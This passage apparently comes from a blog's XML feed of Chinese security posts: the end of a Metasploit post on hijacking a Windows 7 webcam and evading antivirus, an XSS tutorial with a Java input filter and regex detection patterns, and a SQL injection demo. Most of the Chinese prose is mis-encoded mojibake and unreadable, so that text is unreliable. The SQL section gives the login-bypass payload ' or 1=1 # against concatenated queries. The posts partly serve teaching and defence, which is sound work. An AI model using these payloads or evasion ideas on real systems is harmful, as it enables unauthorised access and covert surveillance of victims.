‡ä¸»æœºä¸Šçš„æ‘„åƒæœºå¹¶ä¸”å°†å›¾ç‰‡é€å¸§ä¼ å›žåˆ°Kali Linuxä¸Šã€‚Kalinuxä¼šè‡ªåŠ¨æ‰“å¼€runå‘½ä»¤æ‰€åœ¨çš„ /var/wwwä¸‹çš„ä¸´æ—¶ç½‘ç»œæœåŠ¡ï¼Œç”¨ç½‘é¡µçš„æ–¹å¼æŸ¥çœ‹è¢«æ”»å‡»è€…çŽ°åœºæ‘„åƒæœºã€‚ æˆ‘ä»¬å·²ç»æˆåŠŸçš„æ¸—é€äº†Windows7ï¼Œå¹¶è¿›è¡Œäº†å„ç§æ“ä½œå’Œæ‰“å¼€æ‘„åƒæœºæ‹ç…§ã€‚é‚£ä¹ˆè¿™æ ·å°±ç»“æŸäº†å—ï¼Ÿå…¶å®žè¿™æ‰æ˜¯åˆšåˆšå¼€å§‹ï¼Œæˆ‘ä»¬è¿˜æ²¡æœ‰å¯¹æ¸—é€ç¨‹åºè¿›è¡Œå…æ€å¤„ç†ï¼Œç®€å•çš„è¿œç¨‹æŽ§åˆ¶è½¯ä»¶å¤§éƒ¨åˆ†æ™®é€šçš„ç¨‹åºçŒ¿éƒ½å¯ä»¥åšåˆ°ï¼Œåšåˆ°å…æ€æ‰æ˜¯å…³é”®ï¼ç»•è¿‡æ€æ¯’è½¯ä»¶æ‰æ˜¯æ ¸å¿ƒæŠ€æœ¯ã€‚æ€æ¯’è½¯ä»¶é€šè¿‡ç‰¹å¾ç çš„åŒ¹é…å¯ä»¥å¾ˆå¿«çš„è¯†åˆ«å‡ºè¿™æ˜¯ä¸€ä¸ªæœ¨é©¬ç¨‹åºï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯å’Œæ€æ¯’è½¯ä»¶å¯¹æŠ—ï¼Œå¿…è¦æ—¶éœ€è¦è‡ªå·±ç”¨æ±‡ç¼–ä¿®æ”¹æ–‡ä»¶ç‰¹å¾ç ã€‚æ¯”è¾ƒåŽ‰å®³çš„æ€è½¯ä¼šåœ¨ç¨‹åºè¿è¡ŒæœŸé—´å¯¹å†…å­˜ç‰¹å¾ç è¿›è¡Œæ‰«æï¼Œç›´æŽ¥ç”¨cæˆ–è€…ç¼–è¯‘åž‹çš„ç¨‹åºç›´æŽ¥æ“ä½œç›®æ ‡ä¸»æœºæ–‡ä»¶ä¹Ÿä¼šè¢«å‘çŽ°ï¼Œè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬éœ€è¦ç”¨åŠ¨æ€è„šæœ¬è¯­è¨€ï¼Œæ¯”å¦‚pythonæ¥å†™æœ¨é©¬ï¼Œç„¶åŽåŒ…ä¸Špythonè§£é‡Šå™¨ç¼–è¯‘æˆexeï¼Œåšåˆ°å…æ€ã€‚ è¿™ç¯‡æ–‡ç« ä»…ä»…æ˜¯ä½¿ç”¨msfvenomç”Ÿæˆï¼Œæˆ‘åŽç»­ä¼šå­¦ä¹ æ±‡ç¼–çš„ç›¸å…³çŸ¥è¯†ï¼Œè‡ªå·±åšä¸ªå…æ€çš„æœ¨é©¬ã€‚å‰©ä¸‹çš„éƒ¨åˆ†ï¼Œå°±é ç¤¾ä¼šå·¥ç¨‹å­¦å§ï¼]]></content>
      <categories>
        <category>éšç¬”</category>
      </categories>
      <tags>
        <tag>éšç¬”</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSSæ”»å‡»]]></title>
    <url>%2F4fa736d8%2F</url>
    <content type="text"><![CDATA[XSSæ”»å‡»å…¨ç§°ä¸ºè·¨ç«™è„šæœ¬æ”»å‡»ã€‚XSSæ˜¯ä¸€ç§åœ¨webåº”ç”¨ä¸­çš„è®¡ç®—æœºå®‰å…¨æ¼æ´žï¼Œå…è®¸æ”»å‡»è€…å°†æ¶æ„ä»£ç æ¤å…¥åˆ°ç½‘é¡µä¸­ï¼Œå¯¼è‡´å…¶ä»–æ­£å¸¸ç”¨æˆ·è®¿é—®è¯¥ç½‘é¡µæ—¶è¢«æ”»å‡»ã€‚XSSæœ€å¸¸è§çš„åšæ³•å°±æ˜¯åœ¨æäº¤è¡¨å•ä¸­æ’å…¥htmlæˆ–è€…jsè„šæœ¬æ¥è¾¾åˆ°æ”»å‡»ç›®çš„ã€‚è¿™ç§æ”»å‡»åœ¨äº’è”ç½‘å‘å±•åˆæœŸæ˜¯å¾ˆå¸¸è§çš„ï¼Œç™¾åº¦è´´å§å’Œæ–°æµªå¾®åšæ›¾ç»éƒ½æœ‰è¢«XSSæ”»å‡»è¿‡ã€‚å¼•èµ·XSSæ”»å‡»çš„å…³é”®åŽŸå› è¿˜æ˜¯åœ¨äºŽå¼€å‘æ—¶ç¼–å†™çš„ç¨‹åºä¸å¤Ÿä¸¥è°¨ï¼Œæ²¡æœ‰å¯¹xssè¿›è¡Œè¿‡æ»¤ã€‚ è™½ç„¶XSSæ”»å‡»ä»Žå‡ºçŽ°åˆ°çŽ°åœ¨å·²ç»å¹´ä»£ä¹…è¿œï¼Œä½†æ˜¯ä»–æ‰€äº§ç”Ÿçš„å±å®³ä¸å®¹å°è§†ã€‚å½“å‰ä¸»æµçš„æ¡†æž¶å·²ç»ä¸ºæˆ‘ä»¬æä¾›å¥½å¹¶ä¸”å°è£…äº†å„ç§åŠŸèƒ½ï¼Œå¯¹XSSæ”»å‡»ä¹Ÿå¯ä»¥ç”¨ç®€å•çš„é…ç½®æ¥è¿‡æ»¤æŽ‰ã€‚ä¸è¿‡è¿˜æ˜¯é‚£å¥è¯ï¼Œæ¡†æž¶åªæ˜¯å·¥å…·ï¼Œå…³é”®åœ¨äºŽä½¿ç”¨å·¥å…·çš„äººã€‚å¦‚æžœé‡åˆ°æ¯”è¾ƒå‘çš„å¼€å‘äººå‘˜ï¼Œå°±ç®—ä½¿ç”¨è¿™äº›åšäº†å®‰å…¨è¿‡æ»¤çš„æ¡†æž¶ ä»»ç„¶å¯èƒ½å› ä¸ºä½¿ç”¨ä¸å½“é€ æˆè¢«æ”»å‡»çš„å¯èƒ½ã€‚ ä¹‹å‰é‡åˆ°çš„ä¸€å®¶ç¬¬ä¸‰æ–¹è½¯ä»¶å…¬å¸ï¼Œä»–ä»¬éžå¸¸æŠµè§¦ç”¨æ¡†æž¶æ¥å¼€å‘ï¼Œå…¨éƒ¨ç”¨jspæ¥å†™webç¨‹åºï¼Œå°±å’Œå¤§å­¦è¯¾å ‚ä¸Šæ•™çš„ç¼–ç¨‹åŸºç¡€è¯¾ä¸€æ ·ï¼Œæ²¡æœ‰è€ƒè™‘åˆ°å®‰å…¨é—®é¢˜ï¼Œè‡ªç„¶æœ‰å„ç§æ¼æ´žï¼Œæ²¡æœ‰å†™è¿‡æ»¤å™¨å¯¹XSSè¿›è¡Œè¿‡æ»¤ï¼Œå¯ä»¥å¾ˆè½»æ˜“çš„å°±è¢«æ”»å‡»ã€‚ ä¸‹é¢æ˜¯ç®€å•çš„XSSæ”»å‡»å®žä¾‹ï¼Œä½¿ç”¨jspæ¥æ­å»ºä¸€ä¸ªç®€å•çš„ç½‘ç«™ï¼Œæ²¡æœ‰å¯¹xssè¿›è¡Œè¿‡æ»¤ï¼Œä¸»è¦å°±ä¸¤ä¸ªé¡µé¢1.æŸ¥çœ‹ä¿¡æ¯åˆ—è¡¨é¡µé¢2.æ·»åŠ æ–‡ç« ä¿¡æ¯é¡µé¢ æ­£å¸¸çš„ç”¨æˆ·è¾“å…¥æ–‡å­—å†…å®¹ï¼Œç‚¹å‡»ä¿å­˜è·³è½¬å›žä¿¡æ¯åˆ—è¡¨é¡µé¢ï¼Œå³å¯åœ¨ä¿¡æ¯åˆ—è¡¨é¡µé¢æŸ¥çœ‹åˆ°åˆšåˆšè¾“å…¥çš„æ–‡ç« å†…å®¹ã€‚å¦‚æžœæ˜¯åˆ«æœ‰ç”¨å¿ƒçš„æ”»å‡»è€…ï¼Œåªéœ€è¦è¾“å…¥htmlæˆ–è€…jså³å¯å®Œæˆæ³¨å…¥ã€‚è¿™é‡Œæˆ‘ä»¬è¾“å…¥ä¸€ä¸ªjsè„šæœ¬ç”¨æ¥å¼¹å‡ºå¯¹è¯æ¡†ï¼Œå¹¶æ’å…¥ä¸€ä¸ª aæ ‡ç­¾æ³¨å…¥urlé“¾æŽ¥ã€‚ ç‚¹å‡»ä¿å­˜åŽè·³è½¬åˆ°ä¿¡æ¯åˆ—è¡¨é¡µé¢æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åŽŸæœ¬æ­£å¸¸çš„é¡µé¢å˜å¾—ä¸æ­£å¸¸äº†ï¼Œæµè§ˆå™¨è·³å‡ºäº†å¯¹è¯æ¡†ï¼Œå¯¹è¯æ¡†å†…å®¹å°±æ˜¯æˆ‘ä»¬åˆšåˆšè¾“å…¥çš„jså¼¹å‡ºå†…å®¹ï¼Œå¹¶ä¸”å¯ä»¥çœ‹åˆ°æ–°å¢žè®°å½•çš„æ–‡ç« å†…å®¹å˜æˆäº†ä¸€ä¸ªå¯ä»¥ç‚¹å‡»è·³è½¬çš„é“¾æŽ¥ï¼Œå¦‚æžœæ”»å‡»è€…è¾“å…¥äº†ä¸€ä¸ªå¸¦æœ‰é’“é±¼ç½‘ç«™çš„é“¾æŽ¥ï¼Œé‚£ä¹ˆå…¶ä»–ç”¨æˆ·åœ¨è®¿é—®è¿™ä¸ªç½‘é¡µçš„æ—¶å€™å°±ä¼šçœ‹åˆ°å’ŒçŽ°åœ¨é¡µé¢ä¸€æ ·çš„æƒ…å†µï¼Œå¦‚æžœç‚¹å‡»äº†é“¾æŽ¥å°±æœ‰å¯èƒ½ä¸­æ‹›ã€‚ è¯•ç€æ·»åŠ ä¸€æ¡æ–‡ç« ï¼Œå†…å®¹é‡Œé¢å†™htmlæ ‡ç­¾ï¼Œçœ‹çœ‹èƒ½å¦ç”¨iframeæ¥æ’å…¥ä¸€ä¸ªç½‘é¡µç‚¹å‡»ä¿å­˜ï¼Œå›žåˆ°ä¿¡æ¯åˆ—è¡¨é¡µé¢ï¼Œå‘çŽ°æ–‡ç« å†…å®¹è¢«æ’å…¥äº†ä¸€ä¸ªç½‘é¡µ æ‰“å¼€æ•°æ®åº“ï¼Œå‘çŽ°æˆ‘ä»¬æ•°æ®åº“ç›´æŽ¥å­˜äº†ç”¨æˆ·æäº¤çš„å†…å®¹ï¼Œæ²¡æœ‰è¿›è¡Œä»»ä½•è½¬ä¹‰å¤„ç†ã€‚å…¶ä»–ç”¨æˆ·åœ¨æŸ¥çœ‹ä¿¡æ¯åˆ—è¡¨é¡µé¢æ—¶å°†æŸ¥è¯¢å‡ºæ•°æ®åº“çš„æ•°æ®ç›´æŽ¥ä¼ ç»™æµè§ˆå™¨ï¼Œæµè§ˆå™¨ä¼šç›´æŽ¥è§£é‡Šæ‰§è¡Œè¿™äº›æ ‡ç­¾ï¼Œç»™è®¿é—®çš„ç”¨æˆ·é€ æˆå±å®³ã€‚ æˆ‘ä»¬åº”è¯¥æ·»åŠ ä¸€ä¸ªFilterå¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œè¿‡æ»¤æ–°å»ºä¸€ä¸ªSecurityFilterç±»ç»§æ‰¿è‡ªFilterç±»1234567891011121314151617181920212223242526272829303132333435363738394041package com.lanshiqin.student.filter;import javax.servlet.*;import javax.servlet.http.HttpServletRequest;import java.io.IOException;/** * å®‰å…¨è¿‡æ»¤å™¨ * å¯ä»¥åœ¨doFilterä¸­æ·»åŠ å¤šä¸ªè¿‡æ»¤è§„åˆ™ */public class SecurityFilter implements Filter &#123; @Override public void init(FilterConfig filterConfig) throws ServletException &#123; &#125; /** * è¿‡æ»¤å‡½æ•°,å¯ä»¥æ·»åŠ å¤šä¸ªè§„åˆ™ * * @param servletRequest è¯·æ±‚å¯¹è±¡ * @param servletResponse å“åº”å¯¹è±¡ * @param filterChain è¿‡æ»¤å™¨é“¾ * @throws IOException å¼‚å¸¸ä¿¡æ¯ * @throws ServletException servletå¼‚å¸¸ä¿¡æ¯ */ @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123; // è¿‡æ»¤è¯·æ±‚ä¸­çš„xssæ”»å‡» filterChain.doFilter(new XSSRequestWrapper((HttpServletRequest) servletRequest), servletResponse); // è¿‡æ»¤æˆ–æ‹¦æˆªå…¶ä»–æ”»å‡» // ... &#125; @Override public void destroy() &#123; &#125;&#125; æ–°å»ºä¸€ä¸ªXSSRequestWrapperç±»ç»§æ‰¿è‡ªHttpServletRequestWrapperç±»123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150package com.lanshiqin.student.filter;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletRequestWrapper;import java.util.regex.Pattern;/** * xssè¿‡æ»¤è§„åˆ™åŒ…è£…ç±» */public class XSSRequestWrapper extends HttpServletRequestWrapper &#123; private HttpServletRequest orgRequest; // httpServletè¯·æ±‚å¯¹è±¡ public XSSRequestWrapper(HttpServletRequest request) &#123; super(request); orgRequest = request; &#125; /** * è¦†ç›–getParameteræ–¹æ³•ï¼Œå°†å‚æ•°åå’Œå‚æ•°å€¼éƒ½åšxss &amp; sqlè¿‡æ»¤ã€‚ * å¦‚æžœéœ€è¦èŽ·å¾—åŽŸå§‹çš„å€¼ï¼Œåˆ™é€šè¿‡super.getParameterValues(name)æ¥èŽ·å– * getParameterNames,getParameterValueså’ŒgetParameterMapä¹Ÿå¯èƒ½éœ€è¦è¦†ç›– */ @Override public String getParameter(String name) &#123; String value = super.getParameter(xssEncode(name)); if (value != null) &#123; value = xssEncode(value); &#125; return value; &#125; /** * è¦†ç›–getHeaderæ–¹æ³•ï¼Œå°†å‚æ•°åå’Œå‚æ•°å€¼éƒ½åšxss &amp; sqlè¿‡æ»¤ã€‚ * å¦‚æžœéœ€è¦èŽ·å¾—åŽŸå§‹çš„å€¼ï¼Œåˆ™é€šè¿‡super.getHeaders(name)æ¥èŽ·å– * getHeaderNames ä¹Ÿå¯èƒ½éœ€è¦è¦†ç›– */ @Override public String getHeader(String name) &#123; String value = super.getHeader(xssEncode(name)); if (value != null) &#123; value = xssEncode(value); &#125; return value; &#125; /** * å°†å®¹æ˜“å¼•èµ·xss &amp; sqlæ¼æ´žçš„åŠè§’å­—ç¬¦ç›´æŽ¥æ›¿æ¢æˆå…¨è§’å­—ç¬¦ * * @param s è¯·æ±‚æ•°æ® * @return ç¼–ç åŽçš„è¯·æ±‚æ•°æ® */ private static String xssEncode(String s) &#123; if (s == null || s.isEmpty()) &#123; return s; &#125; else &#123; s = stripXSSAndSql(s); &#125; StringBuilder sb = new StringBuilder(s.length() + 16); for (int i = 0; i &lt; s.length(); i++) &#123; char c = s.charAt(i); switch (c) &#123; case '&gt;': sb.append("ï¼ž");// è½¬ä¹‰å¤§äºŽå· break; case '&lt;': sb.append("ï¼œ");// è½¬ä¹‰å°äºŽå· break; case '\'': sb.append("ï¼‡");// è½¬ä¹‰å•å¼•å· break; case '\"': sb.append("ï¼‚");// è½¬ä¹‰åŒå¼•å· break; case '&amp;': sb.append("ï¼†");// è½¬ä¹‰&amp; break; case '#': sb.append("ï¼ƒ");// è½¬ä¹‰# break; default: sb.append(c); break; &#125; &#125; return sb.toString(); &#125; /** * èŽ·å–æœ€åŽŸå§‹çš„request * * @return request */ public HttpServletRequest getOrgRequest() &#123; return orgRequest; &#125; /** * èŽ·å–æœ€åŽŸå§‹çš„requestçš„é™æ€æ–¹æ³• * åœ¨è£…é¥°è€…è®¾è®¡æ¨¡å¼ä¸‹ï¼Œé™¤äº†è¿‡æ»¤xssï¼Œå¯èƒ½è¿˜æœ‰å¤šä¸ªè¿‡æ»¤å™¨åŒ…è£…ç±» * æä¾›é™æ€æ–¹æ³•æ–¹ä¾¿ç»§æ‰¿è¯¥ç±»çš„è£…é¥°è€…åŒ…è£…æ–°çš„å®‰å…¨è§„åˆ™ * * @return requestè¯·æ±‚å¯¹è±¡ */ public static HttpServletRequest getOrgRequest(HttpServletRequest req) &#123; if (req instanceof XSSRequestWrapper) &#123; return ((XSSRequestWrapper) req).getOrgRequest(); &#125; return req; &#125; /** * é˜²æ­¢xssè·¨è„šæœ¬æ”»å‡»ï¼ˆæ›¿æ¢ï¼Œæ ¹æ®å®žé™…æƒ…å†µè°ƒæ•´ï¼‰ * é€šè¿‡æ­£åˆ™åŒ¹é…æ•æ„Ÿå­—ç¬¦ */ public static String stripXSSAndSql(String value) &#123; if (value != null) &#123; // Avoid anything between script tags Pattern scriptPattern = Pattern.compile("&lt;[\r\n| | ]*script[\r\n| | ]*&gt;(.*?)&lt;/[\r\n| | ]*script[\r\n| | ]*&gt;", Pattern.CASE_INSENSITIVE); value = scriptPattern.matcher(value).replaceAll(""); // Avoid anything in a src="http://www.yihaomen.com/article/java/..." type of e-xpression scriptPattern = Pattern.compile("src[\r\n| | ]*=[\r\n| | ]*[\\\"|\\\'](.*?)[\\\"|\\\']", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL); value = scriptPattern.matcher(value).replaceAll(""); // Remove any lonesome &lt;/script&gt; tag scriptPattern = Pattern.compile("&lt;/[\r\n| | ]*script[\r\n| | ]*&gt;", Pattern.CASE_INSENSITIVE); value = scriptPattern.matcher(value).replaceAll(""); // Remove any lonesome &lt;script ...&gt; tag scriptPattern = Pattern.compile("&lt;[\r\n| | ]*script(.*?)&gt;", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL); value = scriptPattern.matcher(value).replaceAll(""); // Avoid eval(...) expressions scriptPattern = Pattern.compile("eval\\((.*?)\\)", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL); value = scriptPattern.matcher(value).replaceAll(""); // Avoid e-xpression(...) expressions scriptPattern = Pattern.compile("e-xpression\\((.*?)\\)", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL); value = scriptPattern.matcher(value).replaceAll(""); // Avoid javascript:... expressions scriptPattern = Pattern.compile("javascript[\r\n| | ]*:[\r\n| | ]*", Pattern.CASE_INSENSITIVE); value = scriptPattern.matcher(value).replaceAll(""); // Avoid vbscript:... expressions scriptPattern = Pattern.compile("vbscript[\r\n| | ]*:[\r\n| | ]*", Pattern.CASE_INSENSITIVE); value = scriptPattern.matcher(value).replaceAll(""); // Avoid onload= expressions scriptPattern = Pattern.compile("onload(.*?)=", Pattern.CASE_INSENSITIVE | Pattern.MULTILINE | Pattern.DOTALL); value = scriptPattern.matcher(value).replaceAll(""); &#125; return value; &#125;&#125; åœ¨é¡¹ç›®çš„web.xmlä¸­æ·»åŠ å®‰å…¨è¿‡æ»¤å™¨é…ç½®123456789101112131415161718&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd" version="3.1"&gt; &lt;!--å®‰å…¨è¿‡æ»¤å™¨é…ç½®--&gt; &lt;filter&gt; &lt;filter-name&gt;securityFilter&lt;/filter-name&gt; &lt;filter-class&gt;com.lanshiqin.student.filter.SecurityFilter&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;securityFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;dispatcher&gt;REQUEST&lt;/dispatcher&gt; &lt;/filter-mapping&gt;&lt;/web-app&gt; å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„è¿‡æ»¤å™¨ä½œç”¨åŸŸä¸ºREQUESï¼ŒåŒ¹é…è·¯å¾„æˆ‘ä»¬é…ç½®æˆ/*ï¼Œè¿™æ ·è®¿é—®è¯¥ç½‘ç«™çš„æ‰€æœ‰è·¯å¾„çš„è¯·æ±‚éƒ½ä¼šèµ°åˆ°æˆ‘ä»¬çš„è¿‡æ»¤å™¨è¿›è¡Œè¿‡æ»¤ã€‚æˆ‘ä»¬è¿‡æ»¤å™¨ä¸»è¦æ˜¯åšäº†å­—ç¬¦åŒ¹é…æ›¿æ¢çš„æ“ä½œã€‚æŠŠXSSçš„åŠè§’å­—ç¬¦æ›¿æ¢æˆå…¨è§’å­—ç¬¦ï¼Œä¸»è¦å…¶å®žè¿‡æ»¤æŽ‰å°–æ‹¬å·æ ‡ç­¾ï¼Œè®©éžæ³•ç”¨æˆ·æ³¨å…¥çš„htmlæ ‡ç­¾å’Œjsè¢«ç ´åï¼Œé¡µé¢æäº¤é‡æ”¾åŽæ— æ³•æ­£å¸¸æ‰§è¡Œæ³¨å…¥çš„htmlå’Œjsã€‚ åŠ ä¸Šè¿‡æ»¤å™¨åŽæˆ‘ä»¬é‡æ–°è¿è¡Œç½‘ç«™ï¼Œå†æ¬¡è¿›è¡ŒXSSæ³¨å…¥æµ‹è¯•ã€‚æäº¤ä¿å­˜åŽï¼Œå›žåˆ°ä¿¡æ¯åˆ—è¡¨é¡µé¢ï¼Œåº•ä¸‹ä¸¤æ¡æ˜¯æˆ‘ä»¬åˆšåˆšæœ€æ–°æ·»åŠ çš„æ–‡ç« ï¼Œè¾“å…¥å†…å®¹ç›´æŽ¥è¢«æ˜¾ç¤ºå‡ºæ¥äº†ï¼Œurlè¿žæŽ¥ä¹Ÿæ— æ³•æ³¨å…¥äº†ã€‚åŽŸæœ¬çš„åŠè§’å­—ç¬¦è¢«æ›¿æ¢æˆå…¨è§’ï¼Œæ‰€ä»¥xssè¢«ç ´åå°±æ— æ³•è¢«æ‰§è¡Œäº†ã€‚ä¸Šé¢çš„è½¬æ¢è§„åˆ™å¯ä»¥è¿‡æ»¤æŽ‰ä¸€äº›ç®€å•çš„XSSæ³¨å…¥ï¼Œå¦‚æžœä½ çš„ç½‘ç«™åŽå°éœ€è¦æŽ¥å—ä¸€ä¸ªjsonæ ¼å¼çš„æ•°æ®ï¼Œæäº¤çš„jsonæ•°æ®é‡ŒåŠè§’åŒå¼•å·ä¼šè¢«è½¬æ¢æˆå…¨è§’åŒå¼•å·ï¼Œè¿™æ—¶å€™å°±éœ€è¦æ›´åŠ ä¸šåŠ¡éœ€æ±‚ä¿®æ”¹è§„åˆ™ï¼Œæ¯”å¦‚å¯¹ç¬¦å·è¿›è¡Œè½¬ä¹‰ï¼Œè€Œä¸æ˜¯æ›¿æ¢æˆå…¨è§’ã€‚æˆ‘ä»¬ä¸»è¦è¿‡æ»¤çš„å…¶å®žæ˜¯å°–æ‹¬å·æ ‡ç­¾ï¼ŒåŽ»æŽ‰å¤´å°¾ï¼Œä¸€èˆ¬çš„xsså°±ä¼šè¢«ç ´åã€‚ å¾ˆå¤šè®ºå›ç½‘ç«™çš„æ–‡ç« å†…å®¹è¾“å…¥è¡¨å•ï¼Œä¸€èˆ¬éƒ½æ˜¯ç”¨ç±»ä¼¼äºŽUEditerçš„å¯Œæ–‡æœ¬æ¡†æ¥æŽ¥æ”¶ç”¨æˆ·çš„è¾“å…¥ï¼Œä¼šæŠŠç”¨æˆ·è¾“å…¥çš„å†…å®¹è½¬ä¹‰æˆhtmlæ ‡ç­¾è½¬ä¹‰å­—ç¬¦ç»™åŽå°ï¼ŒåŽå°åœ¨å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œç”±äºŽæ•°æ®åº“å­˜æ”¾çš„å·²ç»æ˜¯è½¬ä¹‰åŽçš„æ ‡ç­¾ï¼Œè¿™æ ·å°±ä¸ç”¨æ‹…å¿ƒç”¨æˆ·è¾“å…¥äº†htmlæˆ–è€…jsç­‰å†…å®¹ã€‚ä¿å­˜çš„æ–‡ç« è¢«æŸ¥è¯¢å‡ºæ¥æ—¶æ˜¯è¢«è½¬ä¹‰çš„å­—ç¬¦ï¼Œæµè§ˆå™¨æ— æ³•æ‰§è¡Œè¿™ä¸ªè¢«è½¬ä¹‰çš„æ ‡ç­¾ï¼Œè€Œæ˜¯å½“åšå­—ç¬¦ä¸²è¢«è½¬ä¹‰æˆå†…å®¹æ˜¾ç¤ºåœ¨ç½‘é¡µä¸Šã€‚è¿™æ ·å°±è¿‡æ»¤äº†XSSæ”»å‡»]]></content>
      <categories>
        <category>éšç¬”</category>
      </categories>
      <tags>
        <tag>éšç¬”</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLæ³¨å…¥æ”»å‡»]]></title>
    <url>%2Fd9130e7c%2F</url>
    <content type="text"><![CDATA[sqlæ³¨å…¥åœ¨äº’è”ç½‘åº”ç”¨æ—©æœŸå¾ˆå¸¸è§ï¼Œå¤§å¤šæ•°æ˜¯å› ä¸ºç¨‹åºå‘˜æ²¡æœ‰è€ƒè™‘åˆ°sqlæ³¨å…¥çš„é—®é¢˜å¯¹sqlè¯­å¥è¿›è¡Œè¿‡æ»¤ï¼Œç›´æŽ¥ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æŽ¥çš„æ–¹å¼æ¥ä¼ å€¼ç€å°±ç»™sqlæ³¨å…¥é€ æˆäº†å¯èƒ½ã€‚ ä¸èƒ½å…¬å¼€åšè¿æ³•ä¹±çºªçš„äº‹ï¼Œæ‰€ä»¥æˆ‘è‡ªå·±å†™äº†ä¸ªç¤ºä¾‹ç¨‹åºï¼Œæ¥é‡çŽ°ä¸€ä¸‹å½“æ—¶é‡åˆ°çš„å®‰å…¨é—®é¢˜ã€‚é¦–å…ˆæ˜¯sqlæ³¨å…¥ ç®€å•çš„ç™»å½•è¡¨å•é¡µé¢ æ‰§è¡Œç™»å½•éªŒè¯æ“ä½œçš„ç¨‹åº æ•°æ®åº“ å¯åŠ¨TomcatæœåŠ¡å™¨ï¼Œè®¿é—®é¡¹ç›® è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œå‡è®¾æˆ‘ä»¬ä¸çŸ¥é“å¯†ç ï¼Œè¿™é‡Œæ•…æ„è¾“é”™å¯†ç ï¼Œéšä¾¿è¾“å…¥ä¸€ä¸ªé”™è¯¯çš„å¯†ç ï¼Œç‚¹å‡»ç™»å½• æˆ‘ä»¬å›žåˆ°ç™»å½•é¡µé¢ï¼Œæµ‹è¯•ä¸€ä¸‹sqlæ³¨å…¥ ç‚¹å‡»ç™»å½•ï¼Œå‘çŽ°ç™»å½•æˆåŠŸï¼ æˆ‘ä»¬åœ¨ä¸çŸ¥é“ç”¨æˆ·åå’Œå¯†ç çš„æƒ…å†µä¸‹æˆåŠŸçš„ç™»å½•åˆ°äº†ç™»å½•æˆåŠŸåŽçš„é¡µé¢ï¼Œå®žçŽ°äº†sqlæ³¨å…¥ã€‚é—®é¢˜ä¸»è¦å‡ºåœ¨æ‰§è¡Œç™»å½•ç¨‹åºçš„æ•°æ®åº“æŸ¥è¯¢çš„sqlè¯­å¥1SELECT * FROM user WHERE username='"+userName+"' AND password='"+passWord+"'" ä½¿ç”¨è¿™ç§æ‹¼æŽ¥çš„æ–¹å¼å®¹æ˜“ç»™æ”»å‡»è€…æ³¨å…¥çš„æœºä¼šï¼Œè¿™é‡Œæ‹¼æŽ¥ä¸Šæˆ‘ä»¬ä¼ è¿›æ¥çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œæˆ‘åœ¨ç™»å½•è¡¨å•é‚£é‡Œè¾“å…¥çš„æ•°æ®æ‹¼æŽ¥è¿›æ¥åŽå˜æˆè¿™æ ·1SELECT * FROM user WHERE username='' or 1=1 #' AND password='1234567890' å¯ä»¥çœ‹åˆ°å‰é¢çš„ç¬¦å· â€˜ æŠŠæˆ‘ä»¬æŠŠç”¨æˆ·åå€¼åˆ‡æ–­æŽ‰ï¼Œè®©æ•°æ®åº“æŸ¥è¯¢æ¡ä»¶å˜æˆæŸ¥è¯¢ç”¨æˆ·åä¸ºç©ºå­—ç¬¦ä¸²çš„ï¼Œæ­¤æ—¶æ•°æ®åº“è™½ç„¶æ²¡æœ‰åŒ¹é…çš„è®°å½•ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨åŽé¢å†æ‹¼æŽ¥ä¸Š or 1=1 è¿™æ ·å°±å¯ä»¥æŠŠæ•°æ®åº“ä¸­userè¡¨çš„æ‰€æœ‰è®°å½•éƒ½æŸ¥è¯¢å‡ºæ¥ï¼Œç„¶åŽè¾“å…¥#å·ä¼šæŠŠåŽé¢çš„sqlè¯­å¥éƒ½æ³¨é‡ŠæŽ‰ä¸æ‰§è¡Œæœ€ç»ˆæ‰§è¡Œçš„sqlè¯­å¥å˜æˆè¿™æ ·ï¼š1SELECT * FROM user WHERE username='' or 1=1 æˆ‘ä»¬æˆåŠŸæ³¨å…¥ or 1=1 å¹¶ä¸”è·³è½¬åˆ°ç™»å½•æˆåŠŸåŽçš„é¡µé¢ï¼Œè¿™ç§æ³¨å…¥è¿˜å¯ä»¥è®©æˆ‘ä»¬æ‰§è¡Œä»»æ„sqlè¯­å¥ï¼Œæ¯”å¦‚æ‰§è¡Œåˆ é™¤è¯­å¥æŠŠæ•´ä¸ªæ•°æ®åº“æ•°æ®éƒ½åˆ é™¤ï¼ å¦‚æžœç¨‹åºä¸­çš„sqlæ‹¼æŽ¥æ”¹æˆè¿™æ ·1SELECT * FROM user WHERE username="+userName+" AND password="+passWord é‚£æˆ‘ä»¬çš„sqlæ³¨å…¥å°±éœ€è¦å¤šåŠ ä¸ªâ€™å·1'' or 1=1 # 